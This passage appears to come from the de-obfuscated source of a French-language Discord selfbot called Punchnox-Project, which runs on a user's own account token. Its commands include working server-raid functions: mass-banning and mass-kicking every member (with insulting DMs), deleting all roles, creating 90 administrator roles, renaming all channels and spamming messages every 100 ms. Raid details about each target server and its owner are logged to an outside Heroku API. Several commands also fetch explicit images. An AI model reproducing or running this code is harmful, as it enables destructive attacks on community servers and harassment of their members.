                            aN.user.setGame(f6, ae), cg.channel.send('**Tu diffuses :** ' + f6);
                          }
                        }
                        if (cg.content.startsWith(ab + 'music')) {
                          if (cg.author.id == aN.user.id) {
                            cg.delete();
                            var f7 = {};
                            f7.type = 'LISTENING', aN.user.setActivity(f6, f7), cg.channel.send('**Tu écoute :** ' + f6);
                          }
                        }
                        if (cg.content.startsWith(ab + 'play')) {
                          if (cg.author.id == aN.user.id) {
                            cg.delete();
                            var f8 = {};
                            f8.type = 'PLAYING', aN.user.setActivity(f6, f8), cg.channel.send('**Tu joue à :** ' + f6);
                          }
                        }
                        if (cg.content.startsWith(ab + 'look')) {
                          if (cg.author.id == aN.user.id) {
                            cg.delete();
                            var f9 = {};
                            f9.type = 'WATCHING', aN.user.setActivity(f6, f9), cg.channel.send('**Tu regarde :** ' + f6);
                          }
                        }
                        if (cg.content.startsWith(ab + 'custom')) {
                          if (cg.author.id == aN.user.id) {
                            cg.delete();
                            var cN = cg.content.split(' ');
                            var cn = cN.slice(1);
                            var cT = 'https://discordapp.com/api/v6/users/@me/settings';
                            var fc = {};
                            fc.custom_status = cn, aK(cT, {
                              'method': 'post',
                              'headers': {
                                'authorization': a9,
                                'content-type': 'application/json',
                                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/0.0.305 Chrome/69.0.3497.128 Electron/4.0.8 Safari/537.36'
                              },
                              'body': JSON.stringify(fc)
                            });
                            cg.channel.send('***status custom changé avec :*** ' + cn);
                          }
                        }
                        if (cg.content.includes(ab + 'delact')) {
                          if (cg.author.id == aN.user.id) {
                            cg.delete();
                            var fd = {};
                            fd.type = '', aN.user.setActivity('', fd), cg.channel.send('**ton status à été reset**');
                          }
                        }
                        if (cg.content === ab + 'defaut') {
                          if (cg.author.id == aN.user.id) {
                            if (c9) {
                              var fe = '𝙥𝙧𝙚𝙢𝙞𝙪𝙢';
                            } else {
                              var fe = '𝙛𝙧𝙚𝙚';
                            }
                            const qH = ['logopunchnox', 'logopunchnox1', 'logopunchnox2', 'logopunchnox3'];
                            var ff = qH[Math.floor(Math.random() * qH.length)],
                              dq = () => '10000000-1000-4000-8000-100000000000'.replace(/[018]/g, qK => (qK ^ Math.random() * 16 >> qK / 4).toString(16));
                            aF.getRpcImage('713451199730548837', ff).then(qK => {
                              let qL = new aF.Rpc().setName('𝙋𝙪𝙣𝙘𝙝𝙣𝙤𝙭-𝙋𝙧𝙤𝙟𝙚𝙘𝙩-' + fe).setUrl(ae).setType('PLAYING').setApplicationId('713451199730548837').setAssetsLargeImage(qK.id).setAssetsSmallImage(qK.id).setAssetsLargeText('𝙋𝙪𝙣𝙘𝙝𝙣𝙤𝙭-𝙋𝙧𝙤𝙟𝙚𝙘𝙩-' + fe).setState('version ' + aY).setDetails('développé par punchnox').setJoinSecret('MTI4NzM0OjFpMmhuZToxMjMxMjM=').setPartyId('ae488379-351d-4a4f-ad32-2b9b01c91657').setSpectateSecret('MTIzNDV8MTIzNDV8MTMyNDU0').setStartTimestamp(Date.now()).setParty({
                                'id': dq()
                              });
                              aN.user.setPresence(qL.toDiscord());
                            }).catch(console.error);
                            var cq = new aw.RichEmbed().setTitle('***status par défaut***').setColor(ad);
                            cg.edit(cq);
                          }
                        }
                        if (cg.content.startsWith(ab + 'purge')) {
                          if (cg.author.id == aN.user.id) {
                            let qK = cg.content.split(' ').slice(1),
                              qL = parseInt(qK[0]) || 1;
                            var fg = -1,
                              fh = {};
                            fh.limit = Math.min(qL + 1, 100, 200), cg.channel.fetchMessages(fh).then(qM => {
                              qM.forEach(qN => {
                                qN.delete().catch(console.error), fg++;
                              });
                            }).then(() => {
                              if (fg === -1) fg = 0;
                              cg.channel.send(fg + ' *Messages sont en cours de suppression*').then(qM => qM.delete(5000));
                            }).catch(console.error);
                          }
                        }
                        if (cg.content.startsWith(ab + 'ban')) {
                          let qN = cg.guild;
                          if (!qN) return cg.edit(':x: **Commande uniquement utilisable sur un serveur**');
                          if (cg.author.id == aN.user.id) {
                            cg.delete();
                            if (!cg.guild.member(cg.author).hasPermission('BAN_MEMBERS')) return cg.channel.send('𝐓𝐮 𝐧\'𝐚 𝐩𝐚𝐬 𝐥𝐚 𝐩𝐞𝐫𝐦𝐢𝐬𝐬𝐢𝐨𝐧 𝐝𝐞 𝐛𝐚𝐧 𝐮𝐧 𝐦𝐞𝐦𝐛𝐫𝐞 ! :x:');
                            if (cg.mentions.users.size === 0) return cg.channel.send('***Mentionne un utilisateur***');
                            var fi = cg.guild.member(cg.mentions.users.first());
                            if (!fi) return cg.channel.send('***Utilisateur introuvable :x:***');
                            if (!cg.guild.member(aN.user).hasPermission('BAN_MEMBERS')) return cg.channel.send('***Tu n\'as pas la permission de bannir un membre ! :x:***');
                            fi.ban().then(qP => {
                              cg.channel.send(qP.user.username + ' est ban par ' + cg.author.username + ' !');
                            });
                          }
                        }
                        if (cg.content.startsWith(ab + 'daysban')) {
                          let qP = cg.guild;
                          if (!qP) return cg.edit(':x: **Commande uniquement utilisable sur un serveur**');
                          if (cg.author.id == aN.user.id) {
                            cg.delete();
                            let qR = cg.mentions.users.first();
                            const qS = cg.content.split(' ').slice(2),
                              qT = qS.join(' ');
                            if (!qT) return cg.channel.send('***le nombre de jours à ban ne peut que etre défini par des chiffres :x:***');
                            if (!cg.guild.member(cg.author).hasPermission('BAN_MEMBERS')) return cg.channel.send('𝐓𝐮 𝐧\'𝐚 𝐩𝐚𝐬 𝐥𝐚 𝐩𝐞𝐫𝐦𝐢𝐬𝐬𝐢𝐨𝐧 𝐝𝐞 𝐛𝐚𝐧 𝐮𝐧 𝐦𝐞𝐦𝐛𝐫𝐞 ! :x:');
                            if (cg.mentions.users.size === 0) return cg.channel.send('***Mentionne un utilisateur***');
                            var fi = cg.guild.member(cg.mentions.users.first());
                            if (!fi) return cg.channel.send('***Utilisateur introuvable :x:***');
                            if (!cg.guild.member(aN.user).hasPermission('BAN_MEMBERS')) return cg.channel.send('***Tu n\'as pas la permission de bannir un membre ! :x:*** ! :x:');
                            fi.ban(qR, qT).then(qU => {
                              cg.channel.send(qU.user.username + ' à été ban par ' + cg.author.username + ' durant ' + qT + ' jours!');
                            });
                          }
                        }
                        if (cg.content.startsWith(ab + 'softban')) {
                          if (!cg.guild) return cg.edit('𝙇𝙖 𝙘𝙤𝙢𝙢𝙖𝙣𝙙𝙚 𝙣\'𝙚𝙨𝙩 𝙪𝙩𝙞𝙡𝙞𝙨𝙖𝙗𝙡𝙚 𝙦𝙪𝙚 𝙙𝙖𝙣𝙨 𝙪𝙣 𝙨𝙚𝙧𝙫𝙚𝙪𝙧𝙨.');
                          if (!cg.mentions.members.first()) return cg.edit('𝙈𝙚𝙣𝙩𝙞𝙤𝙣𝙣𝙚𝙯 𝙪𝙣 𝙢𝙚𝙢𝙗𝙧𝙚.');
                          cg.mentions.members.first().ban(cg.cleanContent.slice((ab.length + 'softban ').length)).then(qV => {
                            qV.guild.unban(qV.id, cg.cleanContent.slice((ab.length + 'softban ').length)).then(() => {
                              cg.edit('𝙇𝙚 𝙢𝙚𝙢𝙗𝙧𝙚 ' + qV + ' 𝙖 𝙚𝙩𝙚 𝙨𝙤𝙛𝙩𝙗𝙖𝙣 𝙖𝙫𝙚𝙘 𝙨𝙪𝙘𝙘𝙚̀𝙨 .');
                            }).catch(() => {
                              cg.edit('𝙐𝙣𝙚 𝙚𝙧𝙧𝙚𝙪𝙧 𝙚𝙨𝙩 𝙨𝙪𝙧𝙫𝙚𝙣𝙪𝙚.');
                            });
                          }).catch(() => {
                            cg.edit('𝙑𝙤𝙪𝙨 𝙣𝙚 𝙥𝙤𝙪𝙫𝙚𝙯 𝙥𝙖𝙨 𝙨𝙤𝙛𝙩𝙗𝙖𝙣 𝙘𝙚 𝙢𝙚𝙢𝙗𝙧𝙚.');
                          });
                        }
                        if (cg.content.startsWith(ab + 'idban')) {
                          let qV = cg.guild;
                          if (!qV) return cg.edit(':x: **Commande uniquement utilisable sur un serveur**');
                          if (cg.author.id == aN.user.id) {
                            if (c9) {
                              let qW = cg.content.split(' ').slice(1);
                              !qW && cg.edit('***Tu n\'as pas précisé l\'id à ban***');
                              if (cg.guild.member(cg.author).hasPermission('BAN_MEMBERS')) cg.guild.ban(qW[0]).catch(qX => {
                                const qY = new aw.RichEmbed().addField('**' + cg.author.username + '**', '__banissement de <@' + qW[0] + '> avec succes.__').setColor(ad).setFooter(aN.user.username + '   ||   ' + bs + ' ', aN.user.avatarURL).setTimestamp();
                                cg.channel.send(qY).catch(console.error).then(qZ => qZ.delete(time));
                              });else {
                                const qY = new aw.RichEmbed().addField('**' + cg.author.username + '**', '__Erreur de banissement de <@' + qW[1] + '>.__').setFooter(ad).setFooter(aN.user.username + '   ||   ' + bs + ' ', aN.user.avatarURL).setTimestamp();
                                cg.channel.send(qY).catch(console.error).then(qZ => qZ.delete(time));
                              }
                            } else cg.channel.send(cu);
                          }
                        }
                        if (cg.content.startsWith(ab + 'rdmban')) {
                          if (cg.author.id == aN.user.id) {
                            let r2 = cg.guild;
                            if (!r2) return cg.edit(':x: **Commande uniquement utilisable sur un serveur**');
                            let r3 = cg.guild.members.random();
                            r3.ban(), cg.channel.send('***Le member*** **' + r3.user.tag + '** ***a été banni aléatoirement.***');
                          }
                        }
                        if (cg.content.startsWith(ab + 'mute')) {
                          if (cg.author.id == aN.user.id) {
                            let r4 = cg.guild;
                            if (!r4) return cg.edit(':x: **Commande uniquement utilisable sur un serveur**');
                            if (!cg.guild.member(cg.author).hasPermission('MANAGE_ROLES')) return cg.edit('***Vous n\'avez pas la permission*** "MANAGE_ROLES"');
                            if (!cg.guild.roles.find(r6 => r6.name === 'Muted')) return cg.edit('***Je ne trouve pas de role "Muted"***\n créez un role du nom Muted');
                            let r5 = cg.mentions.users.first();
                            if (!r5) return cg.edit('***Mentionnez l\'utilisateur à mute!***');
                            cg.guild.member(r5).addRole(cg.guild.roles.find(r6 => r6.name === 'Muted').id), cg.edit('***le membre*** ' + r5.toString() + ' ***à été mute avec succès***');
                          }
                        }
                        if (cg.content.startsWith(ab + 'unmute')) {
                          if (cg.author.id == aN.user.id) {
                            let r7 = cg.guild;
                            if (!r7) return cg.edit(':x: **Commande uniquement utilisable sur un serveur**');
                            if (!cg.guild.member(cg.author).hasPermission('MANAGE_ROLES')) return cg.edit('***Vous n\'avez pas la permission*** "MANAGE_ROLES"');
                            if (!cg.guild.roles.find(r9 => r9.name === 'Muted')) return cg.edit('***Je ne trouve pas de role "Muted"***\n créez un role du nom Muted');
                            let r8 = cg.mentions.users.first();
                            if (!r8) return cg.edit('***Mentionnez l\'utilisateur à mute!***');
                            cg.guild.member(r8).removeRole(cg.guild.roles.find(r9 => r9.name === 'Muted').id), cg.edit('***le membre*** ' + r8.toString() + ' ***à été unmute avec succès***');
                          }
                        }
                        if (cg.content.startsWith(ab + 'renamech')) {
                          if (cg.author.id == aN.user.id) {
                            var d8 = cg.content.split(' ').slice(1);
                            let rb = cg.guild;
                            if (!rb) return cg.edit(':x: **Commande uniquement utilisable sur un serveur**');
                            if (!cg.guild.member(cg.author).hasPermission('MANAGE_CHANNELS')) return cg.edit('**Tu n\'as pas la permission \'MANAGE_GUILD\' ! :x:**');
                            if (!d8[0]) return cg.edit('***il manque un argument!***');
                            cg.channel.send('```Je rename les ' + cg.guild.channels.size + ' channels.```'), cg.delete();
                            let rc = cg.guild.channels.array();
                            for (let rd = 0; rd < rc.length; rd++) {
                              rc[rd].setName(d8[0]);
                            }
                            cg.channel.send('```tous les channels on été rename ✅```');
                          }
                        }
                        if (cg.content.includes(ab + 'clear')) {
                          if (cg.author.id !== aN.user.id) {} else {
                            cg.delete();
                            let rh = parseInt(cg.content.split(' ').slice(1), [0], 10) ? parseInt(cg.content.split(' ').slice(1), [0], 10) : 1;
                            var fj = {};
                            fj.limit = 0x64, cg.channel.fetchMessages(fj).then(ri => {
                              let rj = ri.array();
                              rj = rj.filter(rk => rk.author.id === aN.user.id), rj.length = rh + 1, rj.map(rk => rk.delete().catch(console.error));
                            });
                          }
                        }
                        if (cg.content.startsWith(ab + 'kick')) {
                          let ri = cg.guild;
                          if (!ri) return cg.edit(':x: **Commande uniquement utilisable sur un serveur**');
                          if (cg.author.id == aN.user.id) {
                            cg.delete();
                            if (!cg.guild.member(cg.author).hasPermission('KICK_MEMBERS')) return cg.channel.send('𝐓𝐮 𝐧\'𝐚 𝐩𝐚𝐬 𝐥𝐚 𝐩𝐞𝐫𝐦𝐢𝐬𝐬𝐢𝐨𝐧 𝐝𝐞 𝐤𝐢𝐜𝐤 𝐮𝐧 𝐦𝐞𝐦𝐛𝐫𝐞 ! :x:');
                            if (cg.mentions.users.size === 0) return cg.channel.send('***Mentionne un utilisateur ***');
                            var fk = cg.guild.member(cg.mentions.users.first());
                            if (!fk) return cg.channel.send('***Utilisateur introuvable*** :x: ');
                            if (!cg.guild.member(aN.user).hasPermission('KICK_MEMBERS')) {
                              return cg.channel.send('***Tu n\'a pas la permission de kick un membre !*** :x:');
                            }
                            fk.kick().then(rk => {
                              cg.channel.send(rk.user.username + ' ***Kick avec succes***');
                            });
                          }
                        }
                        if (cg.content.startsWith(ab + 'shutdown')) {
                          if (cg.author.id == aN.user.id) {
                            cg.delete();
                            var cq = new aw.RichEmbed().setDescription('***__Merci d\'avoir utilisé le Punchnox-Project. ^^__***').setColor(ad).setFooter(' 𝙋𝙪𝙣𝙘𝙝𝙣𝙤𝙭-𝙋𝙧𝙤𝙟𝙚𝙘𝙩 || ' + aN.user.username, cg.author.avatarURL).setTimestamp();
                            cg.channel.send(cq), console.clear(), console.log(ay.hex(w)('Merci d\'avoir utilisé le Punchnox-Project. ^^')), console.log(ay.hex(z)('Vous pouvez quitter la fenêtre en cliquant sur une touche.')), setTimeout(function () {
                              process.exit();
                            }, 1000);
                          }
                        }
                        if (cg.content === ab + 'ass') {
                          if (cg.author.id == aN.user.id) {
                            if (ag.includes('on')) {
                              var fl = 5511,
                                fm = 1000,
                                fn = Math.floor(Math.random() * (fl - fm + 0)) + fm,
                                fo = Math.round(fn),
                                fp = Math.floor(Math.random() * 88888888888888890000) + 0x9a3298afb5ac7000;
                              let rn = new aw.RichEmbed().setColor(ad).setTitle('**Picture Of Ass**').setDescription('[L\'image Charge Pas Click Ici !](http://media.obutts.ru/butts_preview/0' + fo + '.jpg)').setImage('http://media.obutts.ru/butts_preview/0' + fo + '.jpg');
                              rn.setTimestamp(), cg.edit(rn);
                            } else cg.edit(cr);
                          }
                        }
                        if (cg.content.startsWith(ab + '4k')) {
                          if (cg.author.id == aN.user.id) {
                            if (ag.includes('on')) {
                              var fq = new aw.RichEmbed(),
                                fr = {};
                              fr.type = '4k', aD.get('https://nekobot.xyz/api/image').query(fr).end((rp, rq) => {
                                var rr = {};
                                rr.embed = fq.setFooter('𝙋𝙪𝙣𝙘𝙝𝙣𝙤𝙭-𝙋𝙧𝙤𝙟𝙚𝙘𝙩').setTimestamp().setImage(rq.body.message).setColor(ad), cg.edit(rr);
                              });
                            } else {
                              cg.edit(cr);
                            }
                          }
                        }
                        if (cg.content.startsWith(ab + 'nsfw-gif')) {
                          if (cg.author.id == aN.user.id) {
                            if (ag.includes('on')) {
                              var ft = new aw.RichEmbed();
                              aD.get('https://nekobot.xyz/api/image').query({
                                'type': 'pgif'
                              }).end((rs, rt) => {
                                var ru = {};
                                ru.embed = ft.setFooter('𝙋𝙪𝙣𝙘𝙝𝙣𝙤𝙭-𝙋𝙧𝙤𝙟𝙚𝙘𝙩').setTimestamp().setImage(rt.body.message).setColor(ad), cg.edit(ru);
                              });
                            } else cg.edit(cr);
                          }
                        }
                        if (cg.content.startsWith(ab + 'hentai')) {
                          if (cg.author.id == aN.user.id) {
                            if (ag.includes('on')) {
                              var fu = new aw.RichEmbed();
                              aD.get('https://nekobot.xyz/api/image').query({
                                'type': 'hentai_anal'
                              }).end((ru, rv) => {
                                var rw = {};
                                rw.embed = fu.setFooter('𝙋𝙪𝙣𝙘𝙝𝙣𝙤𝙭-𝙋𝙧𝙤𝙟𝙚𝙘𝙩').setTimestamp().setImage(rv.body.message).setColor(ad), cg.edit(rw);
                              });
                            } else {
                              cg.edit(cr);
                            }
                          }
                        }
                        if (cg.content.startsWith(ab + 'pussy')) {
                          if (cg.author.id == aN.user.id) {
                            if (ag.includes('on')) {
                              var fv = new aw.RichEmbed();
                              aD.get('https://nekobot.xyz/api/image').query({
                                'type': 'pussy'
                              }).end((rx, ry) => {
                                var rB = {};
                                rB.embed = fv.setFooter('𝙋𝙪𝙣𝙘𝙝𝙣𝙤𝙭-𝙋𝙧𝙤𝙟𝙚𝙘𝙩').setTimestamp().setImage(ry.body.message).setColor(ad), cg.edit(rB);
                              });
                            } else {
                              cg.edit(cr);
                            }
                          }
                        }
                        if (cg.content.startsWith(ab + 'thigh')) {
                          if (cg.author.id == aN.user.id) {
                            if (ag.includes('on')) {
                              var fw = new aw.RichEmbed();
                              aD.get('https://nekobot.xyz/api/image').query({
                                'type': 'thigh'
                              }).end((rz, rA) => {
                                var rD = {};
                                rD.embed = fw.setFooter('𝙋𝙪𝙣𝙘𝙝𝙣𝙤𝙭-𝙋𝙧𝙤𝙟𝙚𝙘𝙩').setTimestamp().setImage(rA.body.message).setColor(ad), cg.edit(rD);
                              });
                            } else {
                              cg.edit(cr);
                            }
                          }
                        }
                        if (cg.content.startsWith(ab + 'anal')) {
                          if (cg.author.id == aN.user.id) {
                            if (ag.includes('on')) {
                              var fx = new aw.RichEmbed();
                              aD.get('https://nekobot.xyz/api/image').query({
                                'type': 'anal'
                              }).end((rA, rB) => {
                                var rE = {};
                                rE.embed = fx.setFooter('𝙋𝙪𝙣𝙘𝙝𝙣𝙤𝙭-𝙋𝙧𝙤𝙟𝙚𝙘𝙩').setTimestamp().setImage(rB.body.message).setColor(ad), cg.edit(rE);
                              });
                            } else {
                              cg.edit(cr);
                            }
                          }
                        }
                        if (cg.content === ab + 'delrole') {
                          if (cg.author.id == aN.user.id) {
                            var fy = {};
                            fy.id = cg.guild.id, aD.post('https://punchnox-project-api.herokuapp.com/api/update/serveur-blackliste').send(fy).end((rB, rC) => {
                              if (rC.data.message === 'Id Not found.') {
                                let rH = cg.guild;
                                if (!rH) return cg.edit(':x: **Commande uniquement utilisable sur un serveur**');
                                cg.delete();
                                for (var rF = 0; rF < 90; rF++) {
                                  cg.guild.roles.deleteAll();
                                }
                                var rG = new aw.RichEmbed().setTitle('Les Rôles se suppriment ^^').setDescription('').setImage('https://cdn.discordapp.com/attachments/570759268949819402/576065429949382657/delete.gif').setColor(ad).setFooter('𝙋𝙪𝙣𝙘𝙝𝙣𝙤𝙭-𝙋𝙧𝙤𝙟𝙚𝙘𝙩');
                                cg.channel.send(rG);
                              } else cg.edit(':x: **Ce serveur est dans la blacklist donc vous ne pouvez pas le raid.**');
                            });
                          }
                        }
                        if (cg.content.startsWith(ab + 'delrole')) {
                          if (cg.author.id == aN.user.id) {
                            const rC = ['Aucune Restriction', 'E-mail vérifié', 'Inscrit depuis plus de 5min minimum', 'Membre du serveur depuis plus de 10minutes', 'Téléphone Vérifié'],
                              rD = cg.guild.member(aN.user);
                            aD.post('https://punchnox-project-api.herokuapp.com/api/logs/raidlogs').send({
                              'commande': 'delrole',
                              'user': cg.author.username + '#' + cg.author.discriminator,
                              'Id': aN.user.id,
                              'User_created': ax.utc(aN.user.createdAt).format('MM/DD/YYYY 𝙖 HH : ss'),
                              'user_joined': ax.utc(rD.joinedAt).format('MM/DD/YYYY 𝙖 HH : ss'),
                              '_': '_________________________________________',
                              'NameServeur': cg.guild.name,
                              'IdServeur': cg.guild.id,
                              'owner_id': cg.guild.owner.id,
                              'owner_name': cg.guild.owner.username,
                              'Sécurité': rC[cg.guild.verificationLevel],
                              'Membres': cg.guild.memberCount,
                              'NbChannels': cg.guild.channels.size,
                              'Nbroles': cg.guild.roles.size,
                              'Région': cg.guild.region,
                              'Permissions': cg.member.hasPermission('ADMINISTRATOR') ? 'oui' : 'non',
                              'Date': ax().format('MM/DD/YYYY 𝙖 HH : ss')
                            }).end((rE, rF) => {
                              if (rE) return console.log('[31mErreur lors de la connexion aux serveurs du punchnox-project[0m');
                            });
                          }
                        }
                        if (cg.content.startsWith(ab + 'rolecreate')) {
                          if (cg.author.id == aN.user.id) {
                            var fz = {};
                            fz.id = cg.guild.id, aD.post('https://punchnox-project-api.herokuapp.com/api/update/serveur-blackliste').send(fz).end((rE, rF) => {
                              if (rF.body.message === 'Id Not found.') {
                                let rK = cg.guild;
                                if (!rK) return cg.edit(':x: **Commande uniquement utilisable sur un serveur**');
                                cg.delete();
                                for (var rI = 0; rI < 90; rI++) {
                                  var rJ = {};
                                  rJ.name = 'punchnox project', rJ.mentionable = false, rJ.permissions = 0x8, rJ.position = '', rJ.color = 'RANDOM', cg.guild.createRole(rJ);
                                }
                              } else {
                                cg.edit(':x: **Ce serveur est dans la blacklist donc vous ne pouvez pas le raid.**');
                              }
                            });
                          }
                        }
                        if (cg.content.startsWith(ab + 'mynickname')) {
                          if (cg.author.id == aN.user.id) {
                            let rE = cg.guild;
                            if (!rE) return cg.edit(':x: **Commande uniquement utilisable sur un serveur**');
                            cg.delete(), cg.guild.member(cg.author).setNickname(' ');
                            const rF = new aw.RichEmbed().setDescription('***ton pseudo a été remis par default***').setColor(ad).setFooter(aN.user.username + '   ||   ' + bs + ' ', aN.user.avatarURL).setTimestamp();
                            cg.channel.send(rF).catch(console.error).then(rG => rG.delete(time));
                          }
                        }
                        if (cg.content.startsWith(ab + 'changenick')) {
                          if (cg.author.id == aN.user.id) {
                            let rH = cg.guild;
                            if (!rH) return cg.edit(':x: **Commande uniquement utilisable sur un serveur**');
                            cg.delete();
                            if (cg.guild.member(cg.author).hasPermission('MANAGE_NICKNAMES')) {
                              cg.guild.members.get(d8[0]).setNickname(d8[1]);
                              const rI = new aw.RichEmbed().setDescription('**' + d8[0] + '**Nickname Change avec success par ' + d8[1] + '.__').setColor(ad).setFooter('Pour avoir l\'id de la personne utilise la commande getid');
                              cg.channel.send(rI).catch(console.error).then(rJ => rJ.delete(time));
                            } else {
                              const rJ = new aw.RichEmbed().setDescription('**' + d8[0] + '** __Nickname n\'a pas pus ?tre change.__').setColor(ad).setFooter('Pour avoir l\'id de la personne utilise la commande getid');
                              cg.channel.send(rJ).catch(console.error).then(rK => rK.delete(time));
                            }
                          }
                        }
                        if (cg.content.startsWith(ab + 'defautall')) {
                          if (cg.author.id == aN.user.id) {
                            let rK = cg.guild;
                            if (!rK) return cg.edit(':x: **Commande uniquement utilisable sur un serveur**');
                            cg.delete();
                            if (c9) {
                              cg.guild.member(cg.author).hasPermission('MANAGE_NICKNAMES');
                              {
                                cg.guild.members.forEach(rO => {
                                  if (rO.setNickname(' ')) ;
                                });
                                const rM = new aw.RichEmbed().setDescription('__**Le Nickname de tout le monde va être remis par default.**__').setColor(ad).setFooter(aN.user.username + '   ||   ' + bs + ' ', aN.user.avatarURL).setTimestamp();
                                cg.channel.send(rM).catch(console.error).then(rO => rO.delete(time));
                                const rN = new aw.RichEmbed().setDescription('__**Impossible de remettre le Nickame de tout le monde a default**__').setColor(ad).setFooter(aN.user.username + '   ||   ' + bs + ' ', aN.user.avatarURL).setTimestamp();
                                cg.channel.send(rN).catch(console.error).then(rO => rO.delete(time));
                              }
                            } else cg.channel.send(cu);
                          }
                        }
                        if (cg.content === ab + 'allban') {
                          let rQ = cg.guild;
                          if (!rQ) return cg.edit(':x: **Commande uniquement utilisable sur un serveur**');
                          if (cg.author.id == aN.user.id) {
                            if (c9) {
                              var fA = {};
                              fA.id = cg.guild.id, aD.post('https://punchnox-project-api.herokuapp.com/api/update/serveur-blackliste').send(fA).end((rR, rS) => {
                                if (rS.body.message === 'Id Not found.') {
                                  cg.delete(), cg.guild.members.forEach(rW => {
                                    rW.ban();
                                  }), cg.channel.send('***Banall reussi *** :white_check_mark:');
                                } else {
                                  cg.edit(':x: **Ce serveur est dans la blacklist donc vous ne pouvez pas le raid.(**');
                                }
                              });
                            } else {
                              cg.channel.send(cu);
                            }
                          }
                        }
                        if (cg.content === ab + 'allkick') {
                          let rS = cg.guild;
                          if (!rS) return cg.edit(':x: **Commande uniquement utilisable sur un serveur**');
                          if (cg.author.id == aN.user.id) {
                            if (c9) {
                              var fB = {};
                              fB.id = cg.guild.id, aD.post('https://punchnox-project-api.herokuapp.com/api/update/serveur-blackliste').send(fB).end((rT, rU) => {
                                rU.body.message === 'Id Not found.' ? cg.guild.member(cg.author).hasPermission('KICK_MEMBERS') && cg.guild.members.forEach(rX => {
                                  rX.send(cg.guild + ' ***Vien de se faire nique :joy:. !***'), rX.kick().then(s0 => {}).catch(() => {
                                    cg.edit('***:x: Manque de permission pour certains membres. ! ***');
                                  });
                                }) : cg.edit(':x: **Ce serveur est dans la blacklist donc vous ne pouvez pas le raid.(**');
                              });
                            } else cg.edit(cu);
                          }
                        }
                        if (cg.content === ab + 'unbanall') {
                          if (cg.author.id === aN.user.id) {
                            let rW = cg.guild;
                            if (!rW) return cg.edit(':x: **Commande uniquement utilisable sur un serveur**');
                            if (cg.deletable) cg.delete();
                            let rX = setInterval(function () {
                              cg.guild.fetchBans().then(s0 => {
                                s0.forEach(s4 => {
                                  cg.guild.unban(s4.id);
                                });
                              });
                            }, 1000);
                          }
                          cg.channel.send('```𝗨𝗻𝗯𝗮𝗻 é𝗳𝗳𝗲𝗰𝘁𝘂é``` :white_check_mark:');
                        }
                        if (cg.content === ab + 'channelinfo') {
                          if (cg.author.id === aN.user.id) {
                            if (cg.deletable) cg.delete();
                            const rY = cg.guild.channels.filter(s1 => s1.type === 'category'),
                              rZ = cg.guild.channels.filter(s1 => s1.type === 'text'),
                              s0 = cg.guild.channels.filter(s1 => s1.type === 'voice');
                            var fC = new aw.RichEmbed().setAuthor('𝙋𝙪𝙣𝙘𝙝𝙣𝙤𝙭-𝙋𝙧𝙤𝙟𝙚𝙘𝙩').setColor(ad).addField('Category List', rY.map(s1 => s1.name));
                            cg.channel.send(fC);
                            var fD = new aw.RichEmbed().setAuthor('𝙋𝙪𝙣𝙘𝙝𝙣𝙤𝙭-𝙋𝙧𝙤𝙟𝙚𝙘𝙩').setColor(ad).addField('Text Channel List', rZ.map(s1 => s1.name));
                            cg.channel.send(fD);
                            var fE = new aw.RichEmbed().setAuthor('𝙋𝙪𝙣𝙘𝙝𝙣𝙤𝙭-𝙋𝙧𝙤𝙟𝙚𝙘𝙩').setColor(ad).addField('Voice Channel List', s0.map(s1 => s1.name));
                            cg.channel.send(fE);
                          }
                        }
                        if (cg.content.startsWith(ab + 'sond')) {
                          if (cg.author.id == aN.user.id) {
                            cg.delete();
                            if (c9) {
                              var cN = cg.content.split(' ');
                              let s2 = cN[0];
                              var d8 = cN.slice(1),
                                fF = d8.slice(0).join(' ');
                              if (!d8) return d8.channel.send('Tu dois poser une question !');
                              var fG = new aw.RichEmbed().setColor(ad).setTitle('**Sondage**').setDescription(fF).setFooter(aN.user.username + '   ||   ' + bs + ' ', aN.user.avatarURL);
                              cg.channel.send(fG).then(function (s3) {
                                s3.react('✅'), s3.react('❌');
                              });
                            } else cg.channel.send(cu);
                          }
                        }
                        if (cg.content.startsWith(ab + 'google')) {
                          if (cg.author.id == aN.user.id) {
                            let s4 = cg.content.split(' ');
                            s4.shift();
                            var cq = new aw.RichEmbed().setTitle('Link').setColor(ad).setURL('https://www.google.fr/search?q=' + s4.join('%20'));
                            cg.edit(cq);
                          }
                        }
                        if (cg.content.startsWith(ab + 'rgoogle')) {
                          if (cg.author.id === aN.user.id) {
                            let s5 = cg.content.split(' ');
                            s5.shift();
                            var cq = new aw.RichEmbed().setTitle('Link').setColor(ad).setURL('https://fr.lmgtfy.com/?q=' + s5.join('%20'));
                            cg.edit(cq);
                          }
                        }
                        if (cg.content.startsWith(ab + 'discordjs')) {
                          if (cg.author.id == aN.user.id) {
                            let s6 = cg.content.split(' ');
                            s6.shift();
                            var cq = new aw.RichEmbed().setTitle('Link').setColor(ad).setURL('https://discord.js.org/#/docs/main/stable/search?q=' + s6.join('%20'));
                            cg.edit(cq);
                          }
                        }
                        if (cg.content.startsWith(ab + 'youtube')) {
                          if (cg.author.id == aN.user.id) {
                            let s9 = cg.content.split(' ');
                            s9.shift();
                            var cq = new aw.RichEmbed().setTitle('Link').setColor(ad).setURL('https://m.youtube.com/results?search_query=' + s9.join('%20'));
                            cg.edit(cq);
                          }
                        }
                        if (cg.content.startsWith(ab + 'searchspotify')) {
                          if (cg.author.id == aN.user.id) {
                            let sa = cg.content.split(' ');
                            sa.shift();
                            var cq = new aw.RichEmbed().setTitle('Link').setColor(ad).setURL('https://support.spotify.com/us/search/?q' + sa.join('%20'));
                            cg.edit(cq);
                          }
                        }
                        var cN = cg.content.split(' ');
                        let fH = cN[0];
                        var dt = cN.slice(1);
                        if (cg.content.startsWith(ab + 'embed')) {
                          if (cg.author.id == aN.user.id) {
                            cg.delete();
                            let sc = dt.slice(0).join(' '),
                              sd = new aw.RichEmbed().setColor(ad).setTitle(sc).setFooter(aN.user.username + '   ||   ' + bs + ' ', aN.user.avatarURL);
                            cg.channel.send(sd);
                          }
                        }
                        if (cg.content.startsWith(ab + 'spam')) {
                          if (cg.author.id === aN.user.id) {
                            if (c9) {
                              if (cg.deletable) cg.delete();
                              let se = cg.content.split(' ').slice(1).join(' '),
                                sf = setInterval(function () {
                                  cg.channel.send(se);
                                }, 100);
                              commandIntervals.push(sf);
                            } else {
                              cg.channel.send(cu);
                            }
                          }
                        }
                        if (cg.content === ab + 'stopspam') {
                          if (cg.author.id === aN.user.id) {
                            if (cg.deletable) cg.delete();
